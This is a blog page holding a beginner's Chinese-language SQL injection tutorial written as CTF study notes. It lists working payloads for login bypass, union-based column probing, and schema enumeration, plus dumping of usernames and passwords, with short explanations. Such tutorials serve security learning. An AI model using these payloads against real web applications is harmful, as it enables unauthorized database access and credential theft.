@@ -1,0 +1,780 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    SQL注入基础 | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="SQL注入一.前言SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入基础">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2025/12/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="SQL注入一.前言SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-12-29T07:00:34.000Z">
+<meta property="article:modified_time" content="2026-01-21T08:56:34.922Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="基础">
+<meta property="article:tag" content="常见语句">
+<meta name="twitter:card" content="summary">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+                  <source media="(max-width: 479px)" srcset="/images/banner-600w.avif">
+                  <source media="(max-width: 479px)" srcset="/images/banner-600w.webp">
+                  <source media="(max-width: 799px)" srcset="/images/banner-800w.avif">
+                  <source media="(max-width: 799px)" srcset="/images/banner-800w.webp">
+                  <source media="(min-width: 800px)" srcset="/images/banner.avif">
+                  <source media="(min-width: 800px)" srcset="/images/banner.webp">
+            <img  fetchpriority="high" src="/images/banner.webp" alt="SQL注入基础">
+        </picture>
+          <img alt="SQL注入基础" style="visibility: hidden;">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">SQL注入基础</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">一.前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%AF%B9%E4%BA%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text">二.对于SQL注入漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.可能的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">三.常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.搜索型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">四.联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.</span> <span class="toc-text">四.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.时间盲注</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">19</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-SQL注入基础" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2025-12-29T07:00:34.000Z" itemprop="datePublished">2025-12-29</time>
+    <time style="display: none;" id="post-update-time">2026-01-21</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言）</p>
+<p><strong>注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句</strong></p>
+<h2 id="二-对于SQL注入漏洞的挖掘"><a href="#二-对于SQL注入漏洞的挖掘" class="headerlink" title="二.对于SQL注入漏洞的挖掘"></a>二.对于SQL注入漏洞的挖掘</h2><p>由于现代浏览器比较完善，几乎不可能存在sql注入点（），因此以下所述均为做题中的体会（纯入门心得，有点问题请见谅doge）</p>
+<h3 id="1-可能的注入点"><a href="#1-可能的注入点" class="headerlink" title="1.可能的注入点"></a>1.可能的注入点</h3><p>1). 搜索框，登录界面等，这些地方肯定是与数据库有数据交互的，所以我们可以优先观察存在传值或者查询的地方。</p>
+<p>eg.buuctf 极客大挑战2019 EasySQL</p>
+<p>2). 当没有明显搜索框等明显交互位置时，并不代表不存在sql漏洞，这时可以通过url进行传参。</p>
+<p>eg.buuctf 极客大挑战2019 loveSQL &amp;&amp;Knife(后者虽然通常使用蚁剑来秒杀但是也可以用HackBar当成SQL做同样很快)</p>
+<h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>1.get型</p>
+<p>进行url编码</p>
+<p>如果是在burp中测试payload需要先进行url编码，浏览器中则不需要;</p>
+<p>不进行编码的话，也可以用+代替空格，#代替–+ 。 &#x3D;&#x3D;%23代表#&#x3D;&#x3D;，也是注释符。</p>
+<p>2.post型</p>
+<p>如果是post型的话，我们可以用上面的方法进行编码，或者使用+代替空格，也可以不使用，直接像在浏览器中探测一样。</p>
+<h2 id="三-常见的注入手法"><a href="#三-常见的注入手法" class="headerlink" title="三.常见的注入手法"></a>三.常见的注入手法</h2><p>首先我们应该判断知道其注入类型，SQL注入按照注入点类型分类可分为三种：</p>
+<h3 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h3><p> SQL中的语句格式：select * from users where id &#x3D;x</p>
+<pre><code>    判断方法：使用 1 and 1=1  ，1 and 1=2 来判断
+
+    当输入：and 1=1 时页面显示正常
+
+                   select * from users where id =x and 1=1
+
+        输入：and 1=2 时页面显示异常
+
+                   select * from users where id =x and 1=2
+
+       说明是数字型注入
+</code></pre>
+<h3 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h3><p> SQL中的语句格式：select * from users where id &#x3D;’x’</p>
+<pre><code>    判断方法：使用 1&#39; and &#39;1&#39;=&#39;1  ，1&#39; and &#39;1&#39;=&#39;2 来判断
+
+    当输入：1’ and ‘1’=&#39;1 时页面显示正常
+
+                   select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;1&#39;
+
+       输入：1’ and ‘1’=&#39;2 时页面显示异常
+
+                  select * from users where id =&#39;x&#39; and &#39;1&#39;=&#39;2&#39;
+
+      说明是字符型注入
+</code></pre>
+<h3 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h3><p> 基于搜索框的注入</p>
+<pre><code>    SQL中的语句格式：select * from database.table where users like &#39;%要查询的关键字%&#39;
+
+   判断方法：
+
+     某个商品名称%&#39; and 1=1 and &#39;%&#39;=&#39;  （这个语句的功能就相当于普通SQL注入的 and 1=1）
+</code></pre>
+<p>select * from database.table where users like ‘%某个商品名称%’ and 1&#x3D;1 and ‘%’&#x3D;’%’</p>
+<pre><code>    页面显示正常
+
+     某个商品名称%&#39; and 1=2 and &#39;%&#39;=&#39;  （这个语句的功能就相当于普通SQL注入的 and 1=2）
+</code></pre>
+<p>select * from database.table where users like ‘%某个商品名称%’ and 1&#x3D;2 and ‘%’&#x3D;’%’</p>
+<pre><code>    页面显示异常
+
+    根据上面的返回情况来判断是否存在搜索型注入
+</code></pre>
+<h2 id="四-联合注入"><a href="#四-联合注入" class="headerlink" title="四.联合注入"></a>四.联合注入</h2><p>联合注入是一种非常常用的注入方式，union select 开头的语句属于联合注入，联合注入的必要条件就是页面必须要有回显位，否则就应该考虑使用盲注（后面再展开说明）</p>
+<p>这里我将总结部分比较常用的SQL注入语句：</p>
+<p>首先我们先明确SQL注入的基本流程，在基础的SQL操作中通常有这样的尝试顺序：</p>
+<p>1.先判断SQL注入类型；</p>
+<p>2.判断闭合方式，查询字段，判断回显位；</p>
+<p>3.爆库，爆表，爆列，爆内容。</p>
+<p>另外，页面可能存在过滤，有时要综合考虑各种绕过方法，例如双写绕过，编码绕过等。</p>
+<p>1).查找注入点</p>
+<p> <strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1 = 1#  </span><br></pre></td></tr></table></figure>
+
+<p>(这条万能语句常用于<strong>登录框</strong>之类的注入)</p>
+<p> <strong>作用：<strong>是爆出表中的</strong>所有字段</strong></p>
+<p> <strong>举例</strong>：验证用户名和密码的语句</p>
+<p>我们在这里做出简单的解释：</p>
+<p>页面原sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;$name&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>在进行上述语句后变为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;1&#x27; or 1 = 1#&#x27; and password=&#x27;$pwd&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>#是注释符号，后面的内容被注释，or为或，两边一边为真就是真，由于右边1&#x3D;1为真，故为真；</p>
+<p>因此上述语句就等价于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27; or 1 = 1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2).查询字段数</p>
+<p> <strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 数值#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3).判断回显位</p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1’ union select 1,2,3#</span><br></pre></td></tr></table></figure>
+
+<p>在上一步的查询字段数后我们知道了字段数，接着就根据字段数来判断，若之前找到的字段数为二，事例语句就应该改为</p>
+<p>union select 1,2#</p>
+<p>4).爆破数据库名</p>
+<p><strong>关键</strong>：database()</p>
+<p>​    根据回显位，在回显位输入所要内容对应的关键字。（例如回显位是 2，下面为事例）</p>
+<p> <strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database(),3#   </span><br></pre></td></tr></table></figure>
+
+<p>5).爆破表格名</p>
+<p>关键：</p>
+<p>group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</p>
+<p> <strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3#</span><br></pre></td></tr></table></figure>
+
+<p> 由上述事例可以看出，和爆破数据库名一样的思路,都是在回显位输入所要内容对应的关键字。</p>
+<p>【注意：如果 information_schema 被过滤了，可以使用 sys】（QAQ没用过，本人也不懂emmmmmm）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&amp;&amp;substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),1,1)=&#x27;f&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>6).爆破表格字段</p>
+<p>关键：</p>
+<p>group_concat(column_name) from information_schema.columns where table_name&#x3D;’表格名’</p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;表格名&#x27;,3#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>7).获取字段值</p>
+<p>关键：</p>
+<p>group_concat(id,username,password) from geekuser</p>
+<p><strong>语句：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(id,username,password) from geekuser,3#</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="四-盲注"><a href="#四-盲注" class="headerlink" title="四.盲注"></a>四.盲注</h2><p>前面有提到，当页面不存在回显位时联合注入无法实现，该情况下我们可以考虑盲注<del>（纯猜测）</del>；</p>
+<p>盲注是不能通过直接显示的途径来获取数据库信息。在盲注中，需要根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同）</p>
+<p>盲注分为两种：布尔盲注和时间盲注。</p>
+<h3 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h3><p>后续补充</p>
+<h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.时间盲注"></a>2.时间盲注</h3><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79218813/article/details/135090595">https://blog.csdn.net/2301_79218813/article/details/135090595</a></p>
+
+    </div>
+    <footer class="article-footer">
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag" title="基础">基础</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5/" rel="tag" title="常见语句">常见语句</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/firefly-honkai-star-3840x2160-21360.jpg" data-sizes="auto" alt="流量分析" class="lazyload">
+        <a href="/2025/12/30/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" aria-label="Prev: 流量分析" title="Prev: 流量分析"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            流量分析
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/pd-image (2).png" data-sizes="auto" alt="xss基础" class="lazyload">
+      <a href="/2025/11/23/xss%E5%9F%BA%E7%A1%80/" aria-label="Next: xss基础"  title="Next: xss基础"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          xss基础
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        14.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:10
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">一.前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%AF%B9%E4%BA%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text">二.对于SQL注入漏洞的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.可能的注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">三.常见的注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.搜索型注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">四.联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.</span> <span class="toc-text">四.盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.时间盲注</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
